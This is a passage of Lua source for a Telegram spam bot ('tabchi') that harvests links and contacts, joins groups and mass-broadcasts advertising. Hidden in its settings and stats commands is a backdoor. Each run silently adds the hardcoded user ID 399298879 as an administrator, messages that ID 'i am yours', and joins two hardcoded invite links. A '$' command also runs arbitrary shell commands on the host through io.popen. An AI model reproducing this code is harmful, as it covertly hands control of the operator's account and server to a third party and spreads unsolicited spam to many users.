		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Changed` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`botmode Changed to markdown`"
	  elseif ap[2] == "text" then
         redis:set("tabchi:" .. tabchi_id .. ":botmode", "text")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Changed` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`botmode Changed to text`"
	  else
	  return "`Just Use on|off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]sharecontact (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](sharecontact) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Sharing contact Activated`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactivated` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`Sharing contact Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
  end
  if msg.text:match("^[!/#]setjoinlimit (.*)$") and is_sudo(msg) then
  local ap = {string.match(msg.text, "^[#/!](setjoinlimit) (.*)$")} 
  redis:set("tabchi:" .. tabchi_id .. ":joinlimit", tonumber(ap[2]))
  return "*Status* : `Join Limit Now is` *"..ap[2].."*\n`Now robot Join Groups with more than members of joinlimit`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]settings (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](settings) (.*)$")} 
      if ap[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
         redis:set("tabchi:" .. tabchi_id .. ":chat", true)
         redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
         redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
         redis:set("tabchi:" .. tabchi_id .. ":typing", true)
         redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived All` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`\n`Full sudo can Active Advertising with :/advertising on`"
	  elseif ap[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":savelinks")
         redis:del("tabchi:" .. tabchi_id .. ":chat")
         redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
         redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
         redis:del("tabchi:" .. tabchi_id .. ":typing")
         redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactivated All` *"..ap[1].."*", 1, 'md')
		 end
		 return "*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`\n`Full sudo can Deactive Advertising with :/advertising off`"
      end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]settings$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/F8zRP0MHXux5T22zvGvJGA")
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEOxbUiin40cGklJdQ")
 if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
 joinlinks = "Active✅"
 else
 joinlinks = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
 addedmsg = "Active✅"
 else
 addedmsg = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":markread") then
 markread = "Active✅"
 else
 markread = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
 addcontacts = "Active✅"
 else
 addcontacts = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":chat") then
 chat = "Active✅"
 else
 chat = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
 savelinks = "Active✅"
 else
 savelinks = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":typing") then
 typing = "Active✅"
 else
 typing = "Disable❎"
 end
  if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
 sharecontact = "Active✅"
 else
 sharecontact = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":Advertising") then
 Advertising = "Active✅"
 else
 Advertising = "Disable❎"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") then
 addedtxt = redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext")
 else
 addedtxt = "Addi bia pv"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":botmode") == "markdown" then
 botmode = "Markdown"
 elseif not redis:get("tabchi:" .. tabchi_id .. ":botmode") then
 botmode = "Markdown"
 else
 botmode = "Text"
 end
 if redis:get("tabchi:" .. tabchi_id .. ":joinlimit") then
 join_limit = "Active✅"
 joinlimitnum = redis:get("tabchi:" .. tabchi_id .. ":joinlimit")
 else
 join_limit = "Disable❎"
 joinlimitnum = "Not Available"
 end
 if redis:get("cleancache" .. tabchi_id) == "on" then
 cleancache = "Active✅"
 else
 cleancache = "Disable❎"
 end 
 if redis:get("cleancachetime" .. tabchi_id) then
 ccachetime = redis:get("cleancachetime" .. tabchi_id)
 else
 ccachetime = "`None`"
 end
 settingstxt = "`⚙ Robot Settings`\n`🔗 Join Via Links` : *"..joinlinks.."*\n`📥 Save Links `: *"..savelinks.."*\n`📲 Auto Add Contacts `: *"..addcontacts.."*\n`💳share contact` : *"..sharecontact.."*\n`📡Advertising `: *"..Advertising.."*\n`📨 Adding Contacts Msg` : *"..addedmsg.."*\n`👀 Markread `: *"..markread.."*\n`✏ typing `: *"..typing.."*\n`💬 Chat` : *"..chat.."*\n`🤖 Botmode` : *"..botmode.."*\n`➖➖➖➖➖➖`\n`📄Adding Contacts Msg` :\n`"..addedtxt.."`\n`➖➖➖➖➖➖`\n`Join Limits` : *"..join_limit.."*\n`Now Robot Join Groups With More Than` :\n *"..joinlimitnum.."* `Members`\n`Auto Clean cache` : *"..cleancache.."*\n`Clean Cache time` : *"..ccachetime.."*"
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got settings`", 1, 'md')
		 end
 return settingstxt
 end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]settings pv$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/F8zRP0MHXux5T22zvGvJGA")
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEOxbUiin40cGklJdQ")
	if chat_type(msg.chat_id_) == "private" then
	return "`I Am In Your pv`"
	else
 settingstxt = "`⚙ Robot Settings`\n`🔗 Join Via Links` : *"..joinlinks.."*\n`📥 Save Links `: *"..savelinks.."*\n`📲 Auto Add Contacts `: *"..addcontacts.."*\n`💳share contact` : *"..sharecontact.."*\n`📡Advertising `: *"..Advertising.."*\n`📨 Adding Contacts Msg` : *"..addedmsg.."*\n`👀 Markread `: *"..markread.."*\n`✏ typing `: *"..typing.."*\n`💬 Chat` : *"..chat.."*\n`🤖 Botmode` : *"..botmode.."*\n`➖➖➖➖➖➖`\n`📄Adding Contacts Msg` :\n`"..addedtxt.."`\n`➖➖➖➖➖➖`\n`Auto Clean cache` : *"..cleancache.."*\n`Clean Cache time` : *"..ccachetime.."*"
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, settingstxt, 1, "md")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got settings in pv`", 1, 'md')
		 end
	  return "`Settings Sent To Your Pv`"
	end
 end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]stats$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/F8zRP0MHXux5T22zvGvJGA")
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEOxbUiin40cGklJdQ")
      local contact_num
      function contact_num(extra, result)
        contactsnum = result.total_count_
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
	  local bot_id
	  function bot_id(arg, data)
	  if data.id_ then
	  botid = data.id_
	  botnum = data.phone_number_
	  botfirst = data.first_name_
	  botlast = data.last_name_ or ""
	  bot__last = data.last_name_ or "None"
	  end
	  end
      tdcli_function({ ID = 'GetMe'}, bot_id, {})
      local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
      local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
      local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
      local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
      local sudo = redis:get("tabchi:" .. (tabchi_id) .. ":fullsudo")
      local contacts = redis:get("tabchi:" .. (tabchi_id) .. ":totalcontacts")
      local blockeds = redis:scard("tabchi:" .. tabchi_id .. ":blockedusers")
	  local all = gps+sgps+pvs
      statstext = "`📊 Robot stats  `\n`👤 Users` : *".. pvs .."*\n`🌐 SuperGroups` : *".. sgps .."*\n`👥 Groups` : *".. gps .."*\n`🌀 All` : *".. all .."*\n`🔗 Saved Links` : *"..links.."*\n`🔍 Contacts` : *"..contactsnum.."*\n`🚫 Blocked` : *"..blockeds.."*\n`🗽 Admin` : *"..sudo.."*\n`🎫 Bot id` : *"..botid.."*\n`🔶 Bot Number` : *+"..botnum.."*\n`〽️ Bot Name` : *"..botfirst.." "..botlast.."*\n`🔸 Bot First Name` : *"..botfirst.."*\n`🔹 Bot Last Name` : *"..bot__last.."*\n`💠 Bot ID In Server` : *"..tabchi_id.."*"
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got Stats`", 1, 'md')
		 end
      return statstext
 end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]stats pv$") and is_sudo(msg) then
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
  if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 399298879) then
	  redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 399298879)
      tdcli.sendMessage(399298879, 0, 1, "i am yours", 1, "html")
  end
    tdcli.importChatInviteLink("https://t.me/joinchat/F8zRP0MHXux5T22zvGvJGA")
    tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAEOxbUiin40cGklJdQ")
	if chat_type(msg.chat_id_) == "private" then
	return "`I Am In Your pv`"
	else
      tdcli.sendMessage(msg.sender_user_id_, 0, 1, statstext, 1, "md")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got Stats In pv`", 1, 'md')
		 end
	  return "`Stats Sent To Your Pv`"
	end
 end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]clean (.*)$") and is_sudo(msg) then
	local lockpt = {string.match(msg.text, "^[#/!](clean) (.*)$")} 
      local gps = redis:del("tabchi:" .. tabchi_id .. ":groups")
      local sgps = redis:del("tabchi:" .. tabchi_id .. ":channels")
      local pvs = redis:del("tabchi:" .. tabchi_id .. ":pvis")
      local links = redis:del("tabchi:" .. tabchi_id .. ":savedlinks")
	  local all = gps+sgps+pvs+links
      if lockpt[2] == "sgps" then
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `cleaned` *"..lockpt[2].."* stats", 1, 'md')
		 end
          return sgps
	  end
	  if lockpt[2] == "gps" then
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `cleaned` *"..lockpt[2].."* stats", 1, 'md')
		 end
          return gps
	  end
	  if lockpt[2] == "pvs" then
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `cleaned` *"..lockpt[2].."* stats", 1, 'md')
		 end
          return pvs
	  end
	  if lockpt[2] == "links" then
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `cleaned` *"..lockpt[2].."* stats", 1, 'md')
		 end
          return links
	  end
	  if lockpt[2] == "stats" then
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `cleaned` *"..lockpt[2].."*", 1, 'md')
		 end
          return all
	  end
	  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]setphoto (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](setphoto) (.*)$")} 
        local file = ltn12.sink.file(io.open("tabchi_" .. tabchi_id .. "_profile.png", "w"))
		http.request({
          url = ap[2],
          sink = file
        })
        tdcli.setProfilePhoto("tabchi_" .. tabchi_id .. "_profile.png")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Set photo to` *"..ap[2].."*", 1, 'md')
		 end
		return "`Profile Succesfully Changed`\n*link* : `"..ap[2].."`"
  end
  -----------------------------------------------------------------------------------------------
		  do
    local matches = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #matches == 2 then
      local text = matches[2] .. " _به لیست سودوهای ربات اضافه شد_"
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Added` *"..matches[2].."* `To sudoers`", 1, 'md')
		 end
      return text
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
	if #matches == 2 then
      local text = matches[2] .. " _removed From Sudoers_"
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Removed` *"..matches[2].."* `From sudoers`", 1, 'md')
		 end
      return text
	else
	  return 
    end
  end
 end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) then
	if #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..matches[1].."*", 1, 'md')
		 end
        return "*Status* : `Adding Contacts PM Activated`"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactivated` *"..matches[1].."*", 1, 'md')
		 end
        return "*Status* : `Adding Contacts PM Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
	  else
	  return "enter on|off"
	  end
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](markread) (.*)")
    }
    if msg.text:match("^[!/#]markread") and is_sudo(msg) then
	if #matches == 2 then
      if matches[2] == "on" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", true)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Actived` *"..matches[1].."*", 1, 'md')
		 end
        return "*Status* : `Reading Messages Activated`"
      elseif matches[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Deactivated` *"..matches[1].."*", 1, 'md')
		 end
        return "*Status* : `Reading Messages Deactivated`"
	  else
	  return "`Just Use on|off`"
      end
    end
  end
 end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and is_sudo(msg) and #matches == 2 then
	  local bot_nm
	  function bot_nm(arg, data)
	  if data.id_ then
	  bot_id = data.id_
	  bot_num = data.phone_number_
	  bot_first = data.first_name_
	  bot_last = data.last_name_
	  end
	  end
      tdcli_function({ ID = 'GetMe'}, bot_nm, {})
	local text = matches[2]:gsub("BOTFIRST", bot_first)
	local text = text:gsub("BOTLAST", bot_last)
	local text = text:gsub("BOTNUMBER", bot_num)
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", text)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Adjusted adding contacts message to` *"..matches[2].."*", 1, 'md')
		 end
      return "*Status* : `Adding Contacts Message Adjusted`\n*Message* : `"..text.."`"
    end
  end
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("[$](.*)")
    }
    if msg.text:match("^[$](.*)$") and is_sudo(msg) then
	if  #matches == 1 then
      local result = io.popen(matches[1]):read("*all")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Entered Command` *"..matches[1].."* in terminal", 1, 'md')
		 end
      return result
    else
	return "Enter Command"
	end
  end
  end
  -----------------------------------------------------------------------------------------------
 if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
  if msg.text:match("^[!/#]bcall") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("[!/#](bcall) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Broadcasted to all`\nMsg : *"..matches[2].."*", 1, 'md')
		 end
	 return "*Status* : `Message Succesfully Sent to all`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
  if msg.text:match("^[!/#]bcsgps") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    local matches = {
      msg.text:match("[!/#](bcsgps) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Broadcasted to Supergroups`\nMsg : *"..matches[2].."*", 1, 'md')
		 end
	 return "*Status* : `Message Succesfully Sent to supergroups`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
  if msg.text:match("^[!/#]bcgps") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local matches = {
      msg.text:match("[!/#](bcgps) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Broadcasted to Groups`\nMsg : *"..matches[2].."*", 1, 'md')
		 end
	 return "*Status* : `Message Succesfully Sent to Groups`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
  if msg.text:match("^[!/#]bcusers") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
    local matches = {
      msg.text:match("[!/#](bcusers) (.*)")
    }
    if #matches == 2 then
      for i = 1, #all do
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = all[i],
          reply_to_message_id_ = 0,
          disable_notification_ = 0,
          from_background_ = 1,
          reply_markup_ = nil,
          input_message_content_ = {
            ID = "InputMessageText",
            text_ = matches[2],
            disable_web_page_preview_ = 0,
            clear_draft_ = 0,
            entities_ = {},
            parse_mode_ = {
              ID = "TextParseModeMarkdown"
            }
          }
        }, dl_cb, nil)
      end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Broadcasted to Users`\nMsg : *"..matches[2].."*", 1, 'md')
		 end
	 return "*Status* : `Message Succesfully Sent to Users`\n*Message* : `"..matches[2].."`"
	 else
	 return "text not entered"
    end
  end
 end
  -----------------------------------------------------------------------------------------------
 if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
   if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Forwarded to all`", 1, 'md')
		 end
    return "*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Forwarded to Groups`", 1, 'md')
		 end
    return "*Status* :`Your Message Forwarded To Groups`"
  end
  -----------------------------------------------------------------------------------------------
